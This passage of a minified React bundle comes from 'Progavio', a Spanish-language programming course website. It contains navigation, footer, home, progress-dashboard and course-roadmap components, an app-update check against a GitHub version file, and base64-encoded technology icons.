21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",key:"975kel"}],["circle",{cx:"12",cy:"7",r:"4",key:"17ys0d"}]],qD=Le("user",t7);const n7=[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["path",{d:"M16 3.128a4 4 0 0 1 0 7.744",key:"16gr8j"}],["path",{d:"M22 21v-2a4 4 0 0 0-3-3.87",key:"kshegd"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}]],fP=Le("users",n7);const i7=[["path",{d:"M12.8 19.6A2 2 0 1 0 14 16H2",key:"148xed"}],["path",{d:"M17.5 8a2.5 2.5 0 1 1 2 4H2",key:"1u4tom"}],["path",{d:"M9.8 4.4A2 2 0 1 1 11 8H2",key:"75valh"}]],kD=Le("wind",i7);const o7=[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]],_1=Le("x",o7);const s7=[["path",{d:"M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",key:"1xq2db"}]],Jn=Le("zap",s7),r7=({isFullWidth:a})=>{const{t:e}=iI(),{isAdmin:t,user:n,logout:i}=sr(),{navConfig:r,isPathEnabled:l}=K8(),u=ai(),[d,p]=U.useState(!1),f=a||["/inicio2","/",""].includes(u.pathname.toLowerCase().replace(/\/$/,"")||"/"),h=[{path:"/",label:e("nav.home")},{path:"/roadmap",label:"Cursos"},{path:"/libraries",label:r["/libraries"]?.label||e("nav.libraries")},{path:"/cheatsheets",label:r["/cheatsheets"]?.label||e("nav.cheatsheets")},{path:"/projects",label:r["/projects"]?.label||e("nav.projects")},{path:"/div-playground",label:r["/div-playground"]?.label||e("nav.playground")}],E=()=>p(!d),C=()=>p(!1);return b.jsxs("nav",{className:`navbar ${f?"navbar-transparent navbar-absolute":""}`,children:[b.jsx("div",{className:"navbar-logo",children:b.jsx(jn,{to:"/",onClick:C,children:"Progavio"})}),b.jsx("div",{className:"navbar-search-desktop",children:b.jsx(cP,{})}),b.jsx("button",{className:"mobile-menu-btn",onClick:E,"aria-label":"Toggle menu",children:d?b.jsx(_1,{size:24}):b.jsx(pH,{size:24})}),b.jsxs("ul",{className:`navbar-links ${d?"mobile-open":""}`,children:[b.jsx("li",{className:"mobile-search-item",children:b.jsx(cP,{})}),h.map(A=>l(A.path)&&b.jsx("li",{children:b.jsx(jn,{to:A.path,className:`${u.pathname===A.path?"active":""} ${A.path==="/div-playground"?"div-link":""}`,onClick:C,children:A.label})},A.path)),t&&b.jsx("li",{children:b.jsx(jn,{to:"/admin",className:"admin-link",onClick:C,children:"Admin"})}),n?b.jsxs(b.Fragment,{children:[b.jsx("li",{children:b.jsxs(jn,{to:"/profile",className:u.pathname==="/profile"?"active":"",onClick:C,children:[b.jsx(qD,{className:"nav-icon"})," Perfil"]})}),b.jsx("li",{children:b.jsxs("button",{onClick:()=>{i(),C()},className:"logout-btn",children:[b.jsx(lH,{})," Salir"]})})]}):b.jsx("li",{children:b.jsx(jn,{to:"/login",className:"login-link",onClick:C,children:"Entrar"})})]}),d&&b.jsx("div",{className:"navbar-overlay",onClick:C})]})},l7=()=>window.Capacitor?.isNative?null:b.jsxs("footer",{className:"footer",children:[b.jsxs("div",{className:"footer-content",children:[b.jsxs("div",{className:"footer-brand",children:[b.jsxs("div",{className:"footer-logo",children:[b.jsx("span",{className:"code-icon",children:"</>"}),b.jsx("span",{children:"progavio"})]}),b.jsx("p",{className:"footer-description",children:"Potenciando la prxima generacin de creadores a travs de una educacin en programacin accesible y de alta calidad."})]}),b.jsx("div",{className:"footer-links",children:b.jsxs("div",{className:"link-column",children:[b.jsx("h4",{children:"Recursos"}),b.jsxs("ul",{children:[b.jsx("li",{children:b.jsx("a",{href:"#",children:"Cheatsheets"})}),b.jsx("li",{children:b.jsx("a",{href:"#",children:"Blog"})}),b.jsx("li",{children:b.jsx("a",{href:"#",children:"Consejos de Carrera"})}),b.jsx("li",{children:b.jsx("a",{href:"#",children:"Foros"})})]})]})})]}),b.jsxs("div",{className:"footer-bottom",children:[b.jsx("div",{className:"copyright",children:" 2025 progavio Inc. Todos los derechos reservados."}),b.jsxs("div",{className:"credits",children:["Creado por ",b.jsx("a",{href:"https://octavio-gonzalez.web.app",target:"_blank",rel:"noopener noreferrer",className:"author-link",children:"Octavio Gonzalez"})]}),b.jsx("div",{className:"system-status",children:b.jsx("span",{className:"status-dot"})})]})]}),c7=({children:a})=>{const t=ai().pathname.toLowerCase().replace(/\/$/,"")||"/",n=["/inicio2","/",""].includes(t);return b.jsxs("div",{className:`layout ${n?"layout-full":""}`,children:[b.jsx(r7,{isFullWidth:n}),b.jsx("main",{className:`main-content ${n?"no-padding":""}`,children:a}),t!=="/inicio2"&&b.jsx(l7,{})]})},u7="0.0.15",d7={version:u7},p7=d7.version,m7=()=>{const{t:a}=iI(),e=rr(),[t,n]=Go.useState({url:null,version:null});Go.useEffect(()=>{fetch("https://raw.githubusercontent.com/Owning01/progra-public-releases/main/version.json").then(r=>r.json()).then(r=>{r.apk_url&&r.version&&n({url:r.apk_url,version:r.version})}).catch(r=>console.error("Error checking updates:",r))},[]);const i=t.version&&t.version!==p7;return b.jsxs("div",{className:"home-container",children:[b.jsxs("header",{className:"home-hero",children:[b.jsx("h1",{className:"home-title",children:a("common.title")}),b.jsx("p",{className:"home-description",children:a("common.description")}),t.url&&b.jsxs("div",{className:"download-section",children:[i&&b.jsx("div",{className:"update-alert",children:b.jsxs("span",{children:[a("common.update_available"),b.jsxs("strong",{children:["v",t.version]})]})}),b.jsxs("a",{href:t.url,className:"btn-download-apk",target:"_blank",rel:"noopener noreferrer",children:[b.jsx(ND,{className:"android-icon"})," ",a("common.download_app")," ",t.version?`(v${t.version})`:""]})]})]}),b.jsxs("section",{className:"home-content",children:[b.jsxs("div",{className:"features-grid",children:[b.jsxs("div",{className:"feature-card",onClick:()=>e("/roadmap"),children:[b.jsx("h3",{children:a("home.modules_title")}),b.jsx("p",{children:a("home.modules_desc")})]}),b.jsxs("div",{className:"feature-card",onClick:()=>e("/libraries"),children:[b.jsx("h3",{children:a("home.libs_title")}),b.jsx("p",{children:a("home.libs_desc")})]}),b.jsxs("div",{className:"feature-card",onClick:()=>e("/cheatsheets"),children:[b.jsx("h3",{children:a("home.tricks_title")}),b.jsx("p",{children:a("home.tricks_desc")})]}),b.jsxs("div",{className:"feature-card",onClick:()=>e("/div-playground"),children:[b.jsx("h3",{children:a("home.playground_title")}),b.jsx("p",{children:a("home.playground_desc")})]})]}),b.jsxs("div",{className:"video-section",children:[b.jsx("h2",{children:a("home.video_title")}),b.jsx("div",{className:"video-placeholder",children:b.jsx("div",{className:"video-inner",children:b.jsx("span",{children:"Espacio para video explicativo"})})})]})]})]})},f7=()=>{const{getModuleProgress:a,favorites:e,xp:t,calculateLevel:n}=Jc(),{level:i,nextLevelXp:r,currentLevelMin:l}=n(t),u=(t-l)/(r-l)*100,d=M1.map(p=>({id:p.id,name:p.title.split(":")[0],description:p.description,progress:a(p.id,p.lessons.length)}));return b.jsxs("div",{className:"dashboard-container",children:[b.jsxs("div",{className:"dashboard-header",children:[b.jsxs("div",{children:[b.jsx("h1",{className:"dashboard-title",children:"Mi Progreso"}),b.jsx("p",{className:"dashboard-subtitle",children:"Sigue tu avance en tus cursos."})]}),b.jsxs("div",{className:"xp-card",children:[b.jsxs("div",{className:"xp-level",children:["Nivel ",i]}),b.jsxs("div",{className:"xp-stats",children:[b.jsxs("span",{className:"xp-current",children:[t," XP"]}),b.jsxs("span",{className:"xp-next",children:[r," XP"]})]}),b.jsx("div",{className:"xp-progress-bar",children:b.jsx("div",{className:"xp-progress-fill",style:{width:`${u}%`}})})]})]}),b.jsx("div",{className:"modules-grid",children:d.map(p=>b.jsxs("div",{className:"module-card",children:[b.jsxs("div",{className:"module-info",children:[b.jsxs("h3",{children:[p.name,p.progress===100&&b.jsx(Ys,{className:"completed-check",size:18,color:"#22c55e"})]}),b.jsx("p",{children:p.description})]}),b.jsxs("div",{className:"module-progress-section",children:[b.jsx("div",{className:"progress-bar-container",children:b.jsx("div",{className:"progress-bar-fill",style:{width:`${p.progress}%`}})}),b.jsx("span",{className:"progress-percentage",children:p.progress===100?b.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"4px",color:"#22c55e"},children:[b.jsx(Ys,{size:14})," Completado"]}):`${p.progress}%`})]})]},p.id))}),Object.keys(e).length>0&&b.jsxs("div",{className:"favorites-section",children:[b.jsxs("h2",{className:"dashboard-title",children:["Mis Favoritos ",b.jsx(E0,{className:"inline-icon",size:24,color:"#ef4444",fill:"#ef4444"})]}),b.jsx("div",{className:"favorites-grid",children:Object.entries(e).map(([p,f])=>b.jsxs(jn,{to:`/learn/${f.moduleId}?lesson=${p}`,className:"favorite-card",children:[b.jsx("span",{className:"fav-module",children:f.moduleTitle.split(":")[0]}),b.jsx("h4",{children:f.lessonTitle})]},p))})]})]})},hP={levels:[{name:"Fundamentos",description:"Las bases de la lgica y la programacin.",skills:["Pensamiento Lgico","Algoritmos Bsicos","Variables y Tipos","Matemtica Aplicada","Terminologa General"],modules:[f1.id,E1.id,S1.id,pD.id]},{name:"Git & GitHub",description:"Control de versiones y colaboracin profesional.",skills:["Git Flow","Pull Requests","Code Review"],modules:[h1.id]},{name:"Desarrollo Web",description:"Creacin de interfaces y experiencias de usuario.",skills:["HTML Semntico","CSS Moderno","JavaScript DOM","Arquitectura Visual"],modules:[b1.id,p1.id,y1.id,j1.id]},{name:"Frontend Moderno",description:"Interfaces interactivas y escalables con tecnologas actuales.",skills:["Componentes React","TypeScript Essentials","Tailwind CSS Stylings"],modules:[I1.id,A1.id,R1.id]},{name:"Backend",description:"Lgica de servidor, APIs y manejo de datos.",skills:["Servidores HTTP","REST APIs","Node.js","Python","C/C++"],modules:[C1.id,u1.id,x1.id,v1.id,d1.id]},{name:"Bases de Datos",description:"Persistencia y modelado de datos.",skills:["SQL","NoSQL","ORM","Modelado Relacional"],modules:[rD.id,L1.id,T1.id]},{name:"Redes",description:"Cmo funciona internet por debajo.",skills:["HTTP","TCP/IP","DNS","CORS"],modules:[dD.id]},{name:"Testing",description:"Aseguramiento de la calidad del software.",skills:["Unit Testing","Integration Testing","TDD"],modules:[hD.id]},{name:"Ingeniera de Software",description:"Arquitectura, patrones y cdigo limpio.",skills:["Clean Code","SOLID","Patrones de Diseo","Arquitectura Hexagonal"],modules:[fD.id,oD.id,tD.id]},{name:"Algoritmos",description:"Optimizacin y resolucin de problemas complejos.",skills:["Big O","rboles","Grafos","Hash Maps"],modules:[aD.id]},{name:"DevOps",description:"Automatizacin, despliegue y operaciones.",skills:["CI/CD","Docker","Cloud Basics"],modules:[lD.id]},{name:"Especializacin",description:"Tecnologas avanzadas y herramientas esenciales.",skills:["Formatos de Datos","Scripting","APIs Modernas","WebAssembly"],modules:[m1.id,P1.id,g1.id,w1.id,c1.id,D1.id]}]},C0=[f1,b1,p1,y1,I1,A1,R1,C1,x1,L1,v1,uD,d1,bD,c1,g1,w1,P1,m1,mD,nD,h1,cD,sD,T1,gD,E1,S1,j1,iD,u1,D1],Rn={html:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAADtklEQVR4nO3ZW2xMQRgH8L+oJogHxAPxghc8iMsDbyWoiHQ7s7UlrkFtUQ0pIUKIS0IqEtdQQVwiLhFEJG4JD3WL4EG0IajbnnO2u92DaovSjmxX9HycadeZYRPZL5lkk8k5Z357vpn5dhZIRzrS8f+GwVFncohUNoPho3cAw4uUAzieqwDupBpgctz2DDA5zqsOQBT/eWuYR+5xTgWwPxWAujnkHmWeAQbHxlQAameRSbxBBVCcCsD7GQSw2DPAYshPBcCe1nq9xRHwDsjFaNnArBndhW3b7bakYtNAAohOdTyLIcszwGQYJP12J2cIOxbTA1jViwCqA44U8mOgZ0CIoWdb6WFbIXVAc7MQSzIIwMprfcabAHp4Bgigg8HQKAPEqirVAfU2GXxzEZnAjfExQCVMDkMKqLhLBmsV9lOexN8WkvwPKQ2+BcDwUAq4f5UCSoYrAxoLCeCBDsBlGaCm/AwBhNeOUwZ8mk9S6JIywGA4IgVcOUQA1aX5yoD6uQ4Ax2EdgK0yQPT8dvVJfGM7AXycTQClygCTY7kUcGKDOuDSegL4MNPxDD+W6QDMkgEih5arA86WEMC76QQwUxlg+DFBCtgdVAccn0sANY4ywmDIVgaE8jDMSxEnncT3jlHAAT/pj+S3XhvKxVBlwGsf+mgFPL5IAbvGkv6wo4yIcPRWBogsZBgMTW6Dq16dRdIlevNc+4CqWxRQOoL0O1agZhFEJ+gIk6PGDRBeMoQAah6Vtw8IV1LA+gE/+5oWkWuj0BUGR6UbwJrXlwBioZcivC5bWIHM3wFLM4XYN0mIhnfSUvrrAvIGKnQCbrjm+NQuritP7G2ViF7YJcJrxgixJ1uIOwcTVadbLO30E/A5SFag6zoBp2ST1I5Y3pfRL3UkvRoKSCF3UhvAZNgp3Y3PbmtJnT8GxFOpfK/8OIVhh07AmjaXy7yOIrxilIic3ixir57KAfE0undUiLKcxJwo/uU4xVEHmQyrtQEMhvlJr/0OjP3qiRD1sTYHLWTHKRwFOgG5njayyRm//d5N9jglxOHTBghzjNK2E8t+Si6CiDhOIywfRuoD+NH/bwAaCxP1f3SKyx6Tg37aANZ4dNUBaCqC+FSQKJmdNY/ptkmOR1fojJa3wBA0OE4bHLXJAr4EE4e1UUeV6doYGkyGawbHStOHwfib8SaAziE/xpkMW0yO+17fjpH4B6gsfv4Z9aEbUhVJv51/+S2rvB2TYeKP3ftZS4t/ZpgY7/N843SkIx3/Z3wHrTGmPWk4PzUAAAAASUVORK5CYII=",css:"data:image/png;base64,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",js:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAACHElEQVR4nO2WT0hUURTGz3HUGUSEUNL8FxYmQgWF4UJRRDAQlRYuoqyViButdiUi7WoT0sZoIVorCcHMSKQ0cSEKKZX2oGhhhbQRDZRAxL6483jebjNKEr65A+eDj4Fz7rw5v3nnnXeIRCKRyErBIdhkEgBHACAA+1GsC4YAOLEvGgLg2GMSAEcAIAD7UawLhgA4//uDvOMn3WZuYZhwsZaRlcFIDDCyDzOa6hmLz+IAYLyPEArqHP3hlBCH89YCbC8SCnJ1PJjMKD7mfnqx0tOMXx8sBXg7pOMJCYz3T934l3HC8TzGtSuM9TcW34HJRzqu2mjznT7/cz4OHuKvE2b8QjVj6dW/Xs8CAOXz5eaDGwoymhsZn0bjBGB5knCmOHICBQIuyMac5QDKqsiOFkZqSiTIqROM1RnLATyvTBPu3CBkppsQbZc5tgBq3u8F8Pec/zFL4fnvnc/L8hFATZGGKsbzBzr2ecwEGOnRucd3CSUnI+d99039neQknwAG7lH49e9Nk+tXGT1dhLKzZkuo3UedV/uPF6sqZXybcONrs4TKczqn3ta+AHx8oQF2c+FRvRrc7zDvDDMjJ9NcJZRvtfjYQq/7CWmp0YtXrfCy1+z9zta9gStKoo/SAwNQ/j5FaG9i5B9x57lakxtrGHOD0c/PDBAu1TGKCtx//1CaW/jD24Sthd2m2gEC+GESAEcA4CuASCQSkR/6DRH0JVWM43R/AAAAAElFTkSuQmCC",ts:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAACHUlEQVR4nO2Xy2sTURTG59+YilbUTZciWNBNKVUUFyKIiLTFXcF1mbTaRTdqG5DGIorYpg+ouJCuW/FRkRKlL0jSZjJpHk2DTjENOmkaa5P7lRna2GviI0KSGzwffIuZe+bM+TH3cUaSSCQSSUjJihsiWSIAhQBAAMWo0gXLBKBUvmiZABRxLBGAQgAggGJU6YJlAlB+n3A2kkKxsk/quedrb3pgG4/hxZKBaGILXzYzlnVjG3MrKYy+X8cpu19MgOO3fVD19B/jm51hMQGm/Mm8se0sQyKV4e5dfhwsHcC5/gCuPAnlfHUgxL186WOaGzdd36Pi5F2Vi8syoP15DIc6PVbeI7e8aB2K4I3fwIUHy+VbxAc7PFxhrtBGwbhrg2Eu7rVq/DLnAZtbPIAWJw/g+5S2FnTZd6F/BThxxwfG+Pk/G0nh7P1AdQCYfjaTyFvEjAETi1/R2KeJD1DXvYiF1c08CFOZLMOwK47DP00roQBMH+vyYsS1bu1ChfQhvJHbmYQE2PMZRwCvVKMgRM+ELj6AvOtLj4JYTXzncpjXVQMgK26ctvu5HOb0qrEJBtBwT8ONp9FcYfI+myf1fpnNnXBf4OLDoDWurX1D76RuHWxNDs1q3OajfH/1VkuKC/A3uj4cqU4AxoC+l2vcc8IAHO3yom1sBc7pON4tJxGOb1lt9Ofkjx+Z8/35bUXJAUpt6b8DIJFIJKkc2gEW3WdIAKRLQgAAAABJRU5ErkJggg==",node:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAACpklEQVR4nO2XzWsTQRjGt2D1Iijaf8FLLUmazc4ktiH9yM5sku68AclBLwpCbnqsJxNoERuVHCzqQaGQVElprQh68yD0UBE8F+zFm4p67sGQkUm7yWa7m2SLUgLzg2GZzLvv+zzsfEVRJBKJRCKRSCTHCqKwgwyWUxRlSBlEMAXebIS9VwbaAAWuDCJYGjhmsDRwQDABZzFhJUzZL/EUfaULiReJkWSFbhm1TENbim6pD9URvzXUZO5MNwN9aVLV/DAm2Tyi7Ic9GaLsNyZw2zCMUx3Ci4kTyRVaTq+bf+ZeZ7loU891Hiio9dCiVs0Vcydda1B2CxP4aa+BHX3fmhA1AVH40pHU0fbHGRPxMxU6b6yZe5bwVtvMcq0U44E7YR4sqHvji2jeEtNPDWwz4EsTIqzuGPio6eY18ez4nbC6SG6smY1D4g8aeZnmgUJ430RRbbQMOGpgAtuiBiaw7WrARROmcN1VU2dg9ortOB8SfWfy+NNpV/FWm3iUaBoQX8My4LcG7hKvEbjaEd9rB3COR8uTnKymPQ1kNoBH7kW5iPPK0asGdn6RcnwGlye/iqd9HBH27kgGIqVYU6iXiWTF+K8GEIVdTODykZKj+5ea8zz+uPtUij+ZdjUgpoCfKaR1xvcW2Gs8VIxYi5TT2pynAaNmtvK5LUpkwA2vjcJl0X/CFKa6GkAE3riNi9/tBsJ3teVgIVwXJvCDCVfxqXWzrleN5XYNxvxs1dgrnsBbjZoXD/+ZoCZ4fqL2vrxj9UeLo6fHF9BmoBBuzK7Q9gJ+BVyvpj6QZ+ScM0f7YILv/RyWqpofjhK46TzoxPvabPa88i8ILeALaCn2ObPBuL6a2tUr+livd5pXB3E1IPDNukr0Fd/n9UYikUgkEolEIpFIlEHhLw/Tx/8SyVKrAAAAAElFTkSuQmCC",react:"data:image/png;base64,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